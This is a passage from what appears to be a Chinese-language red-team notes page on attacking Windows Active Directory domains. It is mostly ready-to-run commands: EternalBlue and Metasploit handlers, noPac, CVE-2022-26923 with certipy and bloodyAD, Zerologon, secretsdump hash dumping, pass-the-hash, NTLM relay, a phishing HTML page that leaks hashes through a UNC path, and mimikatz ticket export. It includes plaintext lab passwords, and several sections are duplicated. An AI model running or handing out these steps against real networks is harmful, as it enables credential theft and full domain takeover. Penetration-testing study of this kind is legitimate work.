&#x9ED1;&#x5BA2;&#x5C06;&#x6536;&#x5230;&#x7684;TGS&#x7968;&#x636E;&#x79BB;&#x7EBF;&#x8FDB;&#x884C;&#x7834;&#x89E3;&#xFF0C;&#x5373;&#x53EF;&#x5F97;&#x5230;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5E10;&#x53F7;&#x7684;HASH&#xFF0C;&#x8FD9;&#x4E2A;&#x79F0;&#x4E4B;&#x4E3A;Kerberoast&#x653B;&#x51FB;&#x3002;
&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x4E2A;&#x4E3A;&#x57DF;&#x7528;&#x6237;&#x5E10;&#x6237;&#x6CE8;&#x518C;&#x7684;&#x4EFB;&#x610F;SPN&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x7528;&#x6237;&#x5E10;&#x6237;&#x7684;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x7684;NTLM&#x54C8;&#x5E0C;&#x503C;&#x5C31;&#x5C06;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x670D;&#x52A1;&#x7968;&#x8BC1;&#x3002;
Kerberos&#x653B;&#x51FB;&#x6761;&#x4EF6;&#xFF1A;
&#x91C7;&#x7528;rc4&#x52A0;&#x5BC6;&#x7C7B;&#x578B;&#x7968;&#x636E;&#xFF0C;&#x5DE5;&#x5177;Rubeus&#x68C0;&#x6D4B;&#x6216;&#x770B;&#x7968;&#x636E;&#x52A0;&#x5BC6;&#x7C7B;&#x578B;
</code></pre><h4 id="exchange">Exchange</h4>
<pre><code>1&#x3001;&#x7AEF;&#x53E3;&#x626B;&#x63CF;
exchange&#x4F1A;&#x5BF9;&#x5916;&#x66B4;&#x9732;&#x63A5;&#x53E3;&#x5982;OWA,ECP&#x7B49;&#xFF0C;&#x4F1A;&#x66B4;&#x9732;&#x5728;80&#x7AEF;&#x53E3;&#xFF0C;&#x800C;&#x4E14;25/587/2525&#x7B49;&#x7AEF;&#x53E3;&#x4E0A;&#x4F1A;&#x6709;SMTP&#x670D;&#x52A1;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x7AEF;&#x53E3;&#x7279;&#x5F81;&#x6765;&#x5B9A;&#x4F4D;exchange&#x3002;
2&#x3001;SPN&#x626B;&#x63CF;
powershell setspn -T 0day.org -q */*
3&#x3001;&#x811A;&#x672C;&#x63A2;&#x9488;
python Exchange_GetVersion_MatchVul.py 120.36.143.14
#&#x57DF;&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x5185;&#x7F51;&#x670D;&#x52A1;-Exchange&#x7206;&#x7834;
1&#x3001;Burp+Proxifier

#&#x57DF;&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x5185;&#x7F51;&#x670D;&#x52A1;-Exchange&#x6F0F;&#x6D1E;
&#x786E;&#x5B9A;&#x5185;&#x6838;&#x7248;&#x672C;-&#x7B5B;&#x9009;Server&#x7248;&#x672C;-&#x786E;&#x5B9A;&#x6F0F;&#x6D1E;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;-&#x9009;&#x62E9;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;
&#x53C2;&#x8003;&#x56FE;
CVE-2020-0688
CVE-2020-17144
https://www.cnblogs.com/xiaozi/p/14481595.html
</code></pre><p><a href="https://imgse.com/i/p9CwctI" target="_blank"><img src="https://s1.ax1x.com/2023/04/17/p9CwctI.png" alt="p9CwctI.png"></a></p>
<h4 id="&#x57DF;&#x63A7;&#x63D0;&#x53D6;">&#x57DF;&#x63A7;&#x63D0;&#x53D6;</h4>
<h4 id="ms17-010">MS17-010</h4>
<h6 id="cs&#x5230;msf">CS&#x5230;MSF</h6>
<p><a href="https://imgse.com/i/ppsC7cR" target="_blank"><img src="https://s1.ax1x.com/2023/03/26/ppsC7cR.png" alt="ppsC7cR.png"></a></p>
<p>&#x5148;&#x8BBE;&#x7F6E;&#x76D1;&#x542C;&#x5668;</p>
<p><a href="https://imgse.com/i/ppsC5h4" target="_blank"><img src="https://s1.ax1x.com/2023/03/26/ppsC5h4.png" alt="ppsC5h4.png"></a></p>
<p>&#x5728;msf&#x4E2D;&#x8BBE;&#x7F6E;&#x597D;payload&#x76D1;&#x542C;&#xFF1A;</p>
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 20000
run
</code></pre><p>&#x7136;&#x540E;cs&#x4E2D;&#x6267;&#x884C;spawn 123</p>
<p><a href="https://imgse.com/i/ppsCW7T" target="_blank"><img src="https://s1.ax1x.com/2023/03/26/ppsCW7T.png" alt="ppsCW7T.png"></a></p>
<p>&#x6210;&#x529F;&#x6536;&#x5230;&#x4F1A;&#x8BDD;</p>
<h5 id="&#x68C0;&#x6D4B;ms17-010&#x662F;&#x5426;&#x5B58;&#x5728;">&#x68C0;&#x6D4B;MS17-010&#x662F;&#x5426;&#x5B58;&#x5728;</h5>
<pre><code>//&#x67E5;&#x770B;&#x8DEF;&#x7531;
run autoroute -p
//&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;
run post/multi/manage/autoroute
//&#x68C0;&#x6D4B;ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.52.110-143
set threads 5
run
</code></pre><p>&#x7ED3;&#x679C;&#xFF1A;</p>
<pre><code>[+] 192.168.52.110:445    - Host is likely VULNERABLE to MS17-010! - Windows 10 Enterprise 2016 LTSB 14393 x64 (64-bit)
[+] 192.168.52.138:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.52.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 x86 (32-bit)
[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
</code></pre><p><a href="https://imgse.com/i/p9CDPl6" target="_blank"><img src="https://s1.ax1x.com/2023/04/17/p9CDPl6.png" alt="p9CDPl6.png"></a></p>
<pre><code>//&#x8BBE;&#x7F6E;ms17-010&#x7684;payload&#x8FDB;&#x884C;&#x653B;&#x51FB;[&#x4E0D;&#x51FA;&#x7F51;]
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.52.138
set payload windows/x64/meterpreter/bind_tcp    windows/x64/powershell_bind_tcp
//&#x8FD9;&#x91CC;&#x7684;target&#x662F;1&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;&#x4F60;sessions -i &#x91CC;&#x9762;&#x7684;
set target 1
run
</code></pre><h4 id="cve-2021-42287&#xFF08;nopac&#xFF09;">CVE-2021-42287&#xFF08;Nopac&#xFF09;</h4>
<pre><code class="lang-python"><span class="hljs-comment">#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x57DF;&#x63A7;&#x63D0;&#x6743;-CVE-2021-42287</span>
&#x524D;&#x63D0;&#x6761;&#x4EF6;&#xFF1A;&#x4E00;&#x4E2A;&#x57DF;&#x5185;&#x666E;&#x901A;&#x8D26;&#x53F7;
&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;Windows&#x57FA;&#x672C;&#x5168;&#x7CFB;&#x5217;
https://github.com/cube0x0/noPac
https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools
&#x524D;&#x7F6E;&#xFF1A;
<span class="hljs-number">1</span>&#x3001;&#x4EE3;&#x7406;&#x540E;&#xFF1A;
&#x4FEE;&#x6539;Host&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#x548C;IP
<span class="hljs-number">2</span>&#x3001;&#x626B;&#x63CF;&#x63A2;&#x9488;&#xFF1A;
noPac scan -domain god.org -user administrator -<span class="hljs-keyword">pass</span> A@<span class="hljs-number">2019</span>gaokaowar
<span class="hljs-number">3</span>&#x3001;&#x5229;&#x7528;&#x8FDE;&#x63A5;&#xFF1A;
noPac -domain god.org -user administrator -<span class="hljs-keyword">pass</span> A@<span class="hljs-number">2019</span>gaokaowar /dc owa.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt

PsExec \\owa.god.org cmd


https://github.com/WazeHell/sam-the-admin

python sam_the_admin.py god/<span class="hljs-string">&apos;administrator:A@2019gaokaowar&apos;</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.138</span> -shell
</code></pre>
<h4 id="cve-2022-26923">CVE-2022-26923</h4>
<pre><code>#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x57DF;&#x63A7;&#x63D0;&#x6743;-CVE-2022-26923
&#x5F53;Windows&#x7CFB;&#x7EDF;&#x7684;Active Directory&#x8BC1;&#x4E66;&#x670D;&#x52A1;&#xFF08;CS&#xFF09;&#x5728;&#x57DF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x673A;&#x5668;&#x8D26;&#x53F7;&#x4E2D;&#x7684;dNSHostName&#x5C5E;&#x6027;&#x4E0D;&#x5177;&#x6709;&#x552F;&#x4E00;&#x6027;&#xFF0C;&#x57DF;&#x4E2D;&#x666E;&#x901A;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x66F4;&#x6539;&#x4E3A;&#x9AD8;&#x6743;&#x9650;&#x7684;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x8D26;&#x53F7;&#x5C5E;&#x6027;&#xFF0C;&#x7136;&#x540E;&#x4ECE;Active Directory&#x8BC1;&#x4E66;&#x670D;&#x52A1;&#x4E2D;&#x83B7;&#x53D6;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x8D26;&#x6237;&#x7684;&#x8BC1;&#x4E66;&#xFF0C;&#x5BFC;&#x81F4;&#x57DF;&#x4E2D;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;&#x63D0;&#x5347;&#x4E3A;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x3002;
&#x5F71;&#x54CD;&#xFF1A;Win8.1&#x3001;Win10&#x3001;Win11&#x3001;WinServer2012R2&#x3001;WinServer2016&#x3001;WinServer2019&#x3001;WinServer2022&#x7B49;&#x7248;&#x672C;
&#x524D;&#x63D0;&#x6761;&#x4EF6;&#xFF1A;
1&#x3001;&#x4E00;&#x4E2A;&#x57DF;&#x5185;&#x666E;&#x901A;&#x8D26;&#x53F7;
2&#x3001;&#x57DF;&#x5185;&#x5B58;&#x5728;&#x8BC1;&#x4E66;&#x670D;&#x52A1;&#x5668;
Kali&#x6DFB;&#x52A0;&#x8BBF;&#x95EE;&#x57DF;&#x5185;&#x4FE1;&#x606F; /etc/hosts
192.168.1.15 xiaodi.local
192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA
192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local

&#x83B7;&#x53D6;CA&#x7ED3;&#x6784;&#x540D;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x540D;
certutil -config - -ping
&#x57DF;&#x5185;&#x4FE1;&#x606F;
192.168.1.15
test Pass123
xiaodi-WIN-3C7SS32SQ6R-CA
WIN-3C7SS32SQ6R.xiaodi.local

1&#x3001;&#x7533;&#x8BF7;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x8BC1;&#x4E66;&#xFF1A;
certipy req &apos;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&apos; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug
2&#x3001;&#x68C0;&#x6D4B;&#x8BC1;&#x4E66;
certipy auth -pfx test.pfx
3&#x3001;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x8D26;&#x6237;&#xFF1A;
python3 bloodyAD.py -d xiaodi.local -u test -p &apos;Pass123&apos; --host 192.168.1.15 addComputer pwnmachine &apos;CVEPassword1234*&apos;
4&#x3001;&#x8BBE;&#x7F6E;&#x673A;&#x5668;&#x8D26;&#x6237;&#x5C5E;&#x6027;(dNSHostName&#x548C;DC&#x4E00;&#x81F4;)&#xFF1A;
python3 bloodyAD.py -d xiaodi.local -u test -p &apos;Pass123&apos; --host 192.168.1.15 setAttribute &apos;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&apos; dNSHostName &apos;[&quot;WIN-3C7SS32SQ6R.xiaodi.local&quot;]&apos;
5&#x3001;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x8BC1;&#x4E66;&#xFF1A;
certipy req &apos;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15&apos; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA
6&#x3001;&#x68C0;&#x6D4B;&#x8BC1;&#x4E66;&#xFF1A;
certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15
7&#x3001;&#x5BFC;&#x51FA;HASH&#xFF1A;
python3 secretsdump.py &apos;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&apos; -hashes :10e02bef2258ad9b239e2281a01827a4
8&#x3001;&#x5229;&#x7528;HASH&#xFF1A;
python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd
</code></pre><h4 id="netlogoncve-2020-1472">NetLogon(CVE-2020-1472)</h4>
<pre><code>#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x57DF;&#x63A7;&#x63D0;&#x6743;-CVE-2020-1472
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#xFF1A;
https://github.com/dirkjanm/CVE-2020-1472
&#x6062;&#x590D;&#x5BC6;&#x7801;&#xFF1A;
https://github.com/risksense/zerologon
https://github.com/SecureAuthCorp/impacket
0&#x3001;&#x83B7;&#x53D6;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#xFF1A;
nbtscan -v -h 192.168.3.21
1&#x3001;&#x8FDE;&#x63A5;DC&#x6E05;&#x7A7A;&#x51ED;&#x8BC1;&#xFF1A;
proxychains python cve-2020-1472-exploit.py owa 192.168.52.138
2&#x3001;&#x83B7;&#x53D6;&#x57DF;&#x5185;HASH:
proxychains python secretsdump.py owa\$@192.168.52.138 -just-dc -no-pass

python secretsdump.py &quot;god/administrator&quot;:&quot;hongrisec@2021@&quot;@192.168.52.138
3&#x3001;&#x8FDE;&#x63A5;&#x57DF;&#x63A7;PTH&#xFF1A;
python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
4&#x3001;&#x540E;&#x7EED;&#x6062;&#x590D;&#x5BC6;&#x7801;&#xFF1A;
</code></pre><h4 id="ntlm-relay&#x4E2D;&#x7EE7;&#x653B;&#x51FB;">NTLM Relay&#x4E2D;&#x7EE7;&#x653B;&#x51FB;</h4>
<pre><code>//&#x8001;&#x89C4;&#x77E9;&#xFF0C;&#x5728;cs&#x4E2D;&#x4E0A;&#x7EBF;&#x63D0;&#x6743;&#x5230;system&#x540E;&#x4F1A;&#x8BDD;&#x7ED9;MSF
msf:
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 4123
run
//&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;
run autoroute -p
run post/multi/manage/autoroute
background
use exploit/windows/smb/smb_relay
set smbhost 192.168.52.138
set autorunscript post/windows/manage/migrate
//&#x56E0;&#x4E3A;&#x4E0D;&#x51FA;&#x7F51;&#xFF0C;&#x6240;&#x4EE5;&#x8BBE;&#x7F6E;&#x6210;&#x6B63;&#x5411;&#x8FDE;&#x63A5;
set payload windows/meterpreter/bind_tcp
set rhost 192.168.52.138 //&#x8BBE;&#x7F6E;&#x8FDE;&#x63A5;&#x76EE;&#x6807;
run

//&#x7136;&#x540E;&#x5728;&#x51FA;&#x7F51;&#x7684;&#x673A;&#x5668;&#x6267;&#x884C;dir \\129.226.92.29\c$&#xFF0C;&#x5C31;&#x4F1A;&#x5728;msf&#x4E0A;&#x4E0A;&#x7EBF;  129.226.92.29&#x662F;&#x516C;&#x7F51;&#x7684;&#x653B;&#x51FB;&#x673A;&#x5668;
ps
steal_token 1396   migrate 1396
dir \\129.226.92.29\c$

===============================================================

#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-NTLM&#x4E2D;&#x7EE7;&#x653B;&#x51FB;-Inveigh&#x55C5;&#x63A2;-Hash&#x7834;&#x89E3;
&#x6761;&#x4EF6;&#xFF1A;&#x88AB;&#x63A7;&#x4E3B;&#x673A;&#x5F53;&#x524D;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;
Responder&#x4E2D;&#x7EE7;&#x653B;&#x51FB;-NTLM Hash&#x7834;&#x89E3;
https://github.com/hashcat/hashcat/
https://github.com/Kevin-Robertson/Inveigh
1&#x3001;&#x76D1;&#x542C;&#x62E6;&#x622A;
Inveigh.exe
&#x83B7;&#x53D6;&#x5230;&#x7684;&#x662F;NET NTLM HASH V1&#x6216;V2
2&#x3001;&#x89E6;&#x53D1;&#x62E6;&#x622A;
dir \\192.168.3.x\c$
2.1&#x3001;&#x9493;&#x9C7C;&#x89E6;&#x53D1;
http://192.168.3.31/1.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;img src=&quot;file:///\\192.168.3.32\2&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;
3&#x3001;&#x7834;&#x89E3;&#x5BC6;&#x6587;
hashcat -m 5600 hash pass.txt --show
</code></pre><h4 id="ntlm-inveigh&#x55C5;&#x63A2;">NTLM Inveigh&#x55C5;&#x63A2;</h4>
<pre><code>#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-NTLM&#x4E2D;&#x7EE7;&#x653B;&#x51FB;-Inveigh&#x55C5;&#x63A2;-Hash&#x7834;&#x89E3;
&#x6761;&#x4EF6;&#xFF1A;&#x88AB;&#x63A7;&#x4E3B;&#x673A;&#x5F53;&#x524D;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;
Responder&#x4E2D;&#x7EE7;&#x653B;&#x51FB;-NTLM Hash&#x7834;&#x89E3;
https://github.com/hashcat/hashcat/
https://github.com/Kevin-Robertson/Inveigh
1&#x3001;&#x76D1;&#x542C;&#x62E6;&#x622A;
Inveigh.exe
&#x83B7;&#x53D6;&#x5230;&#x7684;&#x662F;NET NTLM HASH V1&#x6216;V2
2&#x3001;&#x89E6;&#x53D1;&#x62E6;&#x622A;
dir \\192.168.3.x\c$
2.1&#x3001;&#x9493;&#x9C7C;&#x89E6;&#x53D1;
http://192.168.3.31/1.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;img src=&quot;file:///\\192.168.3.32\2&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;
3&#x3001;&#x7834;&#x89E3;&#x5BC6;&#x6587;
hashcat -m 5600 hash pass.txt --show
</code></pre><h4 id="&#x59D4;&#x6D3E;&#x653B;&#x51FB;">&#x59D4;&#x6D3E;&#x653B;&#x51FB;</h4>
<pre><code>#&#x59D4;&#x6D3E;&#x653B;&#x51FB;&#x5206;&#x7C7B;&#xFF1A;
1&#x3001;&#x975E;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;
2&#x3001;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;
3&#x3001;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;

#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x539F;&#x7406;&#x5229;&#x7528;-&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&amp;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
-&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
&#x539F;&#x7406;&#xFF1A;
&#x673A;&#x5668;A&#xFF08;&#x57DF;&#x63A7;&#xFF09;&#x8BBF;&#x95EE;&#x5177;&#x6709;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x6743;&#x9650;&#x7684;&#x673A;&#x5668;B&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4F1A;&#x628A;&#x5F53;&#x524D;&#x8BA4;&#x8BC1;&#x7528;&#x6237;&#xFF08;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#xFF09;&#x7684;&#x7684;TGT&#x653E;&#x5728;ST&#x7968;&#x636E;&#x4E2D;&#xFF0C;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x7ED9;&#x673A;&#x5668;B&#xFF0C;&#x673A;&#x5668;B&#x4F1A;&#x628A;TGT&#x5B58;&#x50A8;&#x5728;lsass&#x8FDB;&#x7A0B;&#x4E2D;&#x4EE5;&#x5907;&#x4E0B;&#x6B21;&#x91CD;&#x7528;&#x3002;&#x4ECE;&#x800C;&#x673A;&#x5668;B&#x5C31;&#x80FD;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;TGT&#x6A21;&#x62DF;&#x8BA4;&#x8BC1;&#x7528;&#x6237;&#xFF08;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#xFF09;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x3002;

&#x5229;&#x7528;&#x573A;&#x666F;
&#x653B;&#x51FB;&#x8005;&#x62FF;&#x5230;&#x4E86;&#x4E00;&#x53F0;&#x914D;&#x7F6E;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x673A;&#x5668;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF1;&#x5BFC;&#x57DF;&#x7BA1;&#x6765;&#x8BBF;&#x95EE;&#x8BE5;&#x673A;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x5F97;&#x5230;&#x7BA1;&#x7406;&#x5458;&#x7684;TGT&#xFF0C;&#x4ECE;&#x800C;&#x6A21;&#x62DF;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#x3002;

&#x590D;&#x73B0;&#x914D;&#x7F6E;&#xFF1A;
1&#x3001;&#x4FE1;&#x4EFB;&#x6B64;&#x8BA1;&#x7B97;&#x673A;&#x6765;&#x59D4;&#x6D3E;&#x4EFB;&#x4F55;&#x670D;&#x52A1;
2&#x3001;setspn -U -A priv/test batmanfuture

&#x5224;&#x65AD;&#x67E5;&#x8BE2;&#xFF1A;
&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x8BBE;&#x7F6E;&#x4E86;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x670D;&#x52A1;&#x8D26;&#x6237;&#xFF1A;
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn
&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x8BBE;&#x7F6E;&#x4E86;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x673A;&#x5668;&#x8D26;&#x6237;:
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn
</code></pre><p><a href="https://imgse.com/i/p9PEkJx" target="_blank"><img src="https://s1.ax1x.com/2023/04/17/p9PEkJx.png" alt="p9PEkJx.png"></a></p>
<p><a href="https://imgse.com/i/p9PEAW6" target="_blank"><img src="https://s1.ax1x.com/2023/04/17/p9PEAW6.png" alt="p9PEAW6.png"></a>&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x8BBE;&#x7F6E;&#x4E86;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x670D;&#x52A1;&#x8D26;&#x6237;&#x548C;&#x975E;&#x673A;&#x5668;&#x8D26;&#x6237;</p>
<p><a href="https://imgse.com/i/p9PEVSK" target="_blank"><img src="https://s1.ax1x.com/2023/04/17/p9PEVSK.png" alt="p9PEVSK.png"></a></p>
<pre><code>#&#x59D4;&#x6D3E;&#x653B;&#x51FB;&#x5206;&#x7C7B;&#xFF1A;
1&#x3001;&#x975E;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;
2&#x3001;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;
3&#x3001;&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;

#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x539F;&#x7406;&#x5229;&#x7528;-&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&amp;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
-&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
&#x539F;&#x7406;&#xFF1A;
&#x673A;&#x5668;A&#xFF08;&#x57DF;&#x63A7;&#xFF09;&#x8BBF;&#x95EE;&#x5177;&#x6709;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x6743;&#x9650;&#x7684;&#x673A;&#x5668;B&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4F1A;&#x628A;&#x5F53;&#x524D;&#x8BA4;&#x8BC1;&#x7528;&#x6237;&#xFF08;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#xFF09;&#x7684;&#x7684;TGT&#x653E;&#x5728;ST&#x7968;&#x636E;&#x4E2D;&#xFF0C;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x7ED9;&#x673A;&#x5668;B&#xFF0C;&#x673A;&#x5668;B&#x4F1A;&#x628A;TGT&#x5B58;&#x50A8;&#x5728;lsass&#x8FDB;&#x7A0B;&#x4E2D;&#x4EE5;&#x5907;&#x4E0B;&#x6B21;&#x91CD;&#x7528;&#x3002;&#x4ECE;&#x800C;&#x673A;&#x5668;B&#x5C31;&#x80FD;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;TGT&#x6A21;&#x62DF;&#x8BA4;&#x8BC1;&#x7528;&#x6237;&#xFF08;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#xFF09;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x3002;

&#x5229;&#x7528;&#x573A;&#x666F;
&#x653B;&#x51FB;&#x8005;&#x62FF;&#x5230;&#x4E86;&#x4E00;&#x53F0;&#x914D;&#x7F6E;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x673A;&#x5668;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF1;&#x5BFC;&#x57DF;&#x7BA1;&#x6765;&#x8BBF;&#x95EE;&#x8BE5;&#x673A;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x5F97;&#x5230;&#x7BA1;&#x7406;&#x5458;&#x7684;TGT&#xFF0C;&#x4ECE;&#x800C;&#x6A21;&#x62DF;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#x3002;

&#x590D;&#x73B0;&#x914D;&#x7F6E;&#xFF1A;
1&#x3001;&#x4FE1;&#x4EFB;&#x6B64;&#x8BA1;&#x7B97;&#x673A;&#x6765;&#x59D4;&#x6D3E;&#x4EFB;&#x4F55;&#x670D;&#x52A1;
2&#x3001;setspn -U -A priv/test batmanfuture

&#x5224;&#x65AD;&#x67E5;&#x8BE2;&#xFF1A;
&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x8BBE;&#x7F6E;&#x4E86;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x670D;&#x52A1;&#x8D26;&#x6237;&#xFF1A;
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn
&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x8BBE;&#x7F6E;&#x4E86;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x673A;&#x5668;&#x8D26;&#x6237;:
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn

&#x5229;&#x7528;&#x6B65;&#x9AA4;&#xFF1A;
1&#x3001;&#x57DF;&#x63A7;&#x4E0E;&#x59D4;&#x6D3E;&#x673A;&#x5668;&#x901A;&#x8BAF;
&#x4E3B;&#x52A8;&#xFF1A;
net use \\webserver
&#x9493;&#x9C7C;&#xFF1A;
http://192.168.3.31/31.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;img src=&quot;file:///\\192.168.3.31\2&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;
2&#x3001;&#x5BFC;&#x51FA;&#x7968;&#x636E;&#x5230;&#x672C;&#x5730;
mimikatz sekurlsa::tickets /export
3&#x3001;&#x5BFC;&#x5165;&#x7968;&#x636E;&#x5230;&#x5185;&#x5B58;
